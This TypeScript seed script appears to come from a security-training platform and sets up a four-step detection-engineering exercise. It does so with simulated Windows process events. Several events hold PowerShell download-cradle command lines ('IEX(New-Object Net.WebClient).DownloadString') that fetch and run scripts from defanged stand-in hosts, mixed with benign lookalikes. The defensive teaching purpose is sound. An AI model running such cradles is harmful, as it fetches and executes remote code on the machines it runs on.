// Seeds the first Purple Team Replay: the same PowerShell download-cradle
// campaign from the Detection Validation Engine, but revealed in ordered,
// cumulative steps so students refine a single detection rule live as the
// attack unfolds, rather than grading one static submission all at once.
//
// Idempotent — safe to run multiple times. Run: npx tsx scripts/seed-purple-team-replay.ts

import { PrismaClient } from "@prisma/client";

const db = new PrismaClient();

type Ev = { id: string; raw: string; fields: Record<string, string>; isMalicious: boolean };

function mkEvent(
  id: string,
  host: string,
  user: string,
  process: string,
  parent: string,
  commandline: string,
  isMalicious: boolean
): Ev {
  return {
    id,
    raw: `Process Create — Host: ${host} | User: ${user} | Image: ${process} | ParentImage: ${parent} | CommandLine: ${commandline}`,
    fields: { host, user, process, parent, commandline },
    isMalicious,
  };
}

const STEP_1_EVENTS: Ev[] = [
  mkEvent("e01", "FIN-WKS-021", "jdoe", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("e02", "OPS-WKS-114", "mchen", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -enc SQBFAFgA... -c DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("fp01", "FIN-WKS-015", "dmartinez", "powershell.exe", "EXCEL.EXE", "powershell.exe -File C:\\Corp\\Scripts\\quarterly_reconcile.ps1 -Signed", false),
  mkEvent("fp03", "FIN-WKS-088", "gnovak", "cmd.exe", "EXCEL.EXE", "cmd.exe /c powershell -c DownloadString('hxxp://cdn-relay-01.net/a.ps1')", false),
  mkEvent("tn01", "FIN-WKS-021", "jdoe", "notepad.exe", "explorer.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\notes.txt", false),
  mkEvent("tn02", "OPS-WKS-114", "mchen", "chrome.exe", "explorer.exe", "chrome.exe --profile-directory=Default", false),
  mkEvent("tn03", "HR-WKS-057", "aosei", "outlook.exe", "explorer.exe", "outlook.exe /recycle", false),
];

const STEP_2_EVENTS: Ev[] = [
  mkEvent("e03", "HR-WKS-057", "aosei", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/b.ps1')", true),
  mkEvent("e04", "REC-WKS-208", "kivanova", "powershell.exe", "EXCEL.EXE", "powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-01.net/a.ps1')", true),
  mkEvent("e05", "ADM-WKS-332", "rpatel", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -c DownloadString('hxxp://cdn-relay-01.net/b.ps1') | IEX", true),
  mkEvent("fp02", "IT-DEPLOY-01", "svc_sccm", "powershell.exe", "svchost.exe", "powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('https://sccm.internal.corp/deploy/patch_kb5031.ps1')", false),
  mkEvent("tn04", "REC-WKS-208", "kivanova", "teams.exe", "explorer.exe", "teams.exe --processStart Teams.exe", false),
  mkEvent("tn05", "ADM-WKS-332", "rpatel", "excel.exe", "explorer.exe", "EXCEL.EXE C:\\Users\\rpatel\\Documents\\budget_q3.xlsx", false),
  mkEvent("tn06", "CLN-WKS-441", "twhitfield", "winword.exe", "explorer.exe", "WINWORD.EXE C:\\Users\\twhitfield\\Documents\\memo.docx", false),
  mkEvent("tn09", "FIN-WKS-015", "dmartinez", "svchost.exe", "services.exe", "svchost.exe -k netsvcs -p", false),
  mkEvent("tn10", "IT-DEPLOY-01", "svc_sccm", "msiexec.exe", "svchost.exe", "msiexec.exe /i patch_kb5031.msi /quiet", false),
];

const STEP_3_EVENTS: Ev[] = [
  mkEvent("e06", "CLN-WKS-441", "twhitfield", "powershell.exe", "EXCEL.EXE", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-02.net/a.ps1')", true),
  mkEvent("e07", "FIN-WKS-099", "nsilva", "powershell.exe", "EXCEL.EXE", "powershell.exe -w hidden -enc <base64> -c DownloadString('hxxp://cdn-relay-02.net/a.ps1')", true),
  mkEvent("e08", "OPS-WKS-276", "chaddad", "powershell.exe", "WINWORD.EXE", "powershell.exe -nop -c IEX(New-Object Net.WebClient).DownloadString('hxxp://cdn-relay-02.net/b.ps1')", true),
  mkEvent("fp04", "HR-WKS-203", "lreyes", "powershell.exe", "WINWORD.EXE", "powershell.exe -File C:\\Corp\\Scripts\\compliance_check_2026.ps1", false),
  mkEvent("tn07", "FIN-WKS-099", "nsilva", "acrord32.exe", "explorer.exe", "AcroRd32.exe C:\\Users\\nsilva\\Downloads\\invoice.pdf", false),
  mkEvent("tn08", "OPS-WKS-276", "chaddad", "slack.exe", "explorer.exe", "slack.exe --process-start-args", false),
  mkEvent("tn11", "FIN-WKS-088", "gnovak", "cmd.exe", "explorer.exe", "cmd.exe /c dir C:\\Reports", false),
];

const STEP_4_EVENTS: Ev[] = [
  mkEvent("tn12", "HR-WKS-203", "lreyes", "powershell.exe", "explorer.exe", "powershell.exe Get-Service | Where-Object Status -eq Running", false),
];

const STEPS = [
  { step: 1, narrative: "A handful of workstations show a PowerShell download cradle launched from an Office macro — but so does one that turns out to be a signed internal script. Write a first-pass rule.", events: STEP_1_EVENTS },
  { step: 2, narrative: "More hosts show the same pattern. IT's own SCCM deployment pipeline also uses DownloadString for legitimate patching — does your rule still hold up?", events: STEP_2_EVENTS },
  { step: 3, narrative: "The campaign keeps spreading, and a second lookalike (a legitimate compliance script) surfaces on a Word-macro host. Refine again.", events: STEP_3_EVENTS },
  { step: 4, narrative: "Last batch — one more benign PowerShell admin habit shows up. Finalize your rule against the complete picture.", events: STEP_4_EVENTS },
];

async function main() {
  await db.purpleTeamReplay.upsert({
    where: { slug: "phishing-cradle-live-replay" },
    update: {
      title: "Purple Team Replay: PowerShell Cradle Campaign",
      description:
        "Watch the same phishing campaign from the Detection Lab unfold live, in four steps. Hold one detection " +
        "rule and adjust it as each new batch of events arrives — some are more of the real attack, some are " +
        "deliberately similar-looking benign activity designed to break a rule that's too broad.",
      difficulty: "HARD",
      points: 400,
      published: true,
      steps: STEPS,
    },
    create: {
      slug: "phishing-cradle-live-replay",
      title: "Purple Team Replay: PowerShell Cradle Campaign",
      description:
        "Watch the same phishing campaign from the Detection Lab unfold live, in four steps. Hold one detection " +
        "rule and adjust it as each new batch of events arrives — some are more of the real attack, some are " +
        "deliberately similar-looking benign activity designed to break a rule that's too broad.",
      difficulty: "HARD",
      points: 400,
      published: true,
      steps: STEPS,
    },
  });

  console.log(`✓ Purple Team Replay seeded: phishing-cradle-live-replay (${STEPS.length} steps).`);
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(() => db.$disconnect());
